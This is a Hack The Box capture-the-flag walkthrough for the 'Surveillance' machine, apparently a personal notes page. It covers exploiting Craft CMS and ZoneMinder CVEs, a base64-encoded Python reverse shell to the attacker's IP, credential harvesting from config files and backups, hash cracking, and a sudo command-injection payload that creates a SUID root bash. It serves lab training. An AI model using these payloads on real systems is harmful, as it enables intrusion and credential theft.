---
tags:
  - hack
  - linux
---
# HTB: [Surveillance](https://app.hackthebox.com/machines/Surveillance)

> [!tip]- Summary with Spoilers
> This Linux machine is running an outdated version of Craft CMS with an unauthenticated RCE vulnerability.
>
> For privilege escalation, there is a a defunct instance of ZoneMinder installed with discoverable credentials for the `zoneminder` user. That user may run several executables via Sudo, at least one of which is exploitable for root access.
>
> There's another vector by modifying the `LD_PRELOAD` in the ZoneMinder admin console, and providing a malicious shared object. I couldn't quite figure this out, as I couldn't successfully reload the daemon to trigger the `LD_PRELOAD`.

## Services

```console
$ sudo nmap -v -sCV -p- -T4 t
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 11:44 CST
...
Nmap scan report for t (10.10.11.245)
Host is up (0.098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
...
```

### TCP

#### 80/tcp Http

```console
$ whatweb http://t/
http://t/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], RedirectLocation[http://surveillance.htb/], Title[302 Found], nginx[1.18.0]
http://surveillance.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

From view-source:

```html
<!-- footer section -->|
<section class="footer_section">
<div class="container">
<p>
&copy; <span id="displayYear"></span> All Rights Reserved By
SURVEILLANCE.HTB</a><br> <b>Powered by <a href="[https://github.com/craftcms/cms/tree/4.4.14](https://github.com/craftcms/cms/tree/4.4.14)"/>Craft CMS</a></b>
</p>
</div>
</section>
```

This version of Craft CMS should be vulnerable to [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892). A PoC is [available](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce).

## RCE

```console
$ python3 ./51918.py http://surveillance.htb/
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjEyIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIikn|sh
```

## PE

```console
www-data@surveillance:~/html$ netstat -lnpt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1101/nginx: worker
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1101/nginx: worker
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Found some credentials for the `mysql` database:

```console
www-data@surveillance:~/html/craft$ pwd
pwd
/var/www/html/craft
www-data@surveillance:~/html/craft$ cat .env
cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

This reveals a hash:

```mysql
MariaDB [craftdb]> select * from users;
select * from users;
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | active | pending | locked | suspended | admin | username | fullName  | firstName | lastName | email                  | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |      1 |       0 |      0 |         0 |     1 | admin    | Matthew B | Matthew   | B        | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | 2023-10-17 20:42:03 | NULL               | NULL                    |              NULL | 2023-10-17 20:38:18  | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2023-10-17 20:38:29    | 2023-10-11 17:57:16 | 2023-10-17 20:42:03 |
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.001 sec)
```

There is also a username `matthew` in `/etc/passwd`.

I run `john` against the hash, but it's a computationally intension hashing algorithm and makes very slow progress.

I run LinPeas on the target and it uncovers the following SQL backup:

```text
-rw-r--r-- 1 root root 19918 Oct 17 20:33 /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

I unzip the backup and grep for `admin@`, and that reveals an older hash in a format that's much faster to crack:

```console
$ hashcat -a0 ./hash2 ~/rockyou.txt -m1400
hashcat (v6.2.6) starting
[...]
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```

And that gets us into the user account:

```console
$ ssh matthew@$t
matthew@10.10.11.245's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
[...]

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
matthew@surveillance:~$ cat user.txt
21ade4[...]
```

## PE

Running `LinPeas` again as user `matthew` gives us new credentials, this time for ZoneMinder's database:

```console
╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r-- 1 root zoneminder 5265 Nov 18  2022 /usr/share/zoneminder/www/ajax/modals/storage.php
-rw-r--r-- 1 root zoneminder 1249 Nov 18  2022 /usr/share/zoneminder/www/includes/actions/storage.php

-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
                'password' => ZM_DB_PASS,
                'database' => ZM_DB_NAME,
                'host' => 'localhost',
                'password' => 'ZoneMinderPassword2023',
                'database' => 'zm',
                                $this->default['host'] = $array[0];
                        $this->default['host'] = ZM_DB_HOST;
```

Those credentials work for the MySQL databases named `zm`, and I get a new hash:

```text
|  1 | admin    | $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd. | [...]
```

But, that's another computationally-intensive hashing algorithm.

```console
matthew@surveillance:/usr/share/zoneminder/www/includes$ dpkg -l |grep zonem
hi  zoneminder                            1.36.32+dfsg1-1                         amd64        video camera security and surveillance solution
```

This version of ZoneMinder should be vulnerable to [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035).

```console
$ python3 ./51902.py  -t http://localhost:88 -ip 10.10.14.12 -p 443
[>] fetching csrt token
[>] recieved the token: key:2f36672784048210f25b56b636d26d67933df57a,1715627714
[>] executing...
[>] sending payload..
```

```text
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.245] 41790
bash: cannot set terminal process group (1090): Inappropriate ioctl for device
zoneminder@surveillance:/usr/share/zoneminder/www$ id
id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

```console
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_ptyUser zoneminder may run the following commands on surveillance:
(ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *

zoneminder@surveillance:/usr/share/zoneminder/www$ ls /usr/bin/zm[a-zA-Z]*.pl
ls /usr/bin/zm[a-zA-Z]*.pl
/usr/bin/zmaudit.pl
/usr/bin/zmcamtool.pl
/usr/bin/zmcontrol.pl
/usr/bin/zmdc.pl
/usr/bin/zmfilter.pl
/usr/bin/zmonvif-probe.pl
/usr/bin/zmonvif-trigger.pl
/usr/bin/zmpkg.pl
/usr/bin/zmrecover.pl
/usr/bin/zmstats.pl
/usr/bin/zmsystemctl.pl
/usr/bin/zmtelemetry.pl
/usr/bin/zmtrack.pl
/usr/bin/zmtrigger.pl
/usr/bin/zmupdate.pl
/usr/bin/zmvideo.pl
/usr/bin/zmwatch.pl
/usr/bin/zmx10.pl
```

```console
zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 10 -u '$(cp /bin/bash /tmp/x; chown root:root /tmp/x; chmod 6777 /tmp/x)'Initiating database upgrade to version 1.36.32 from version 10WARNING - You have specified an upgrade from version 10 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : yDo you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-10.dump. This may take several minutes.
mysqldump: Got error: 1698: "Access denied for user '-pZoneMinderPassword2023'@'localhost'" when trying to connect
Output:
Command 'mysqldump -u$(cp /bin/bash /tmp/x; chown root:root /tmp/x; chmod 6777 /tmp/x) -p'ZoneMinderPassword2023' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-10.dump' exited with status: 2
zoneminder@surveillance:/tmp$ ls -l x
-rwsrwsrwx 1 root root 1396520 May 13 21:22 x
```

```console
zoneminder@surveillance:/tmp$ ./x -p
x-5.1# id
uid=1001(zoneminder) gid=1001(zoneminder) euid=0(root) egid=0(root) groups=0(root),1001(zoneminder)
x-5.1# cat /root/root.txt
714fb0...
```
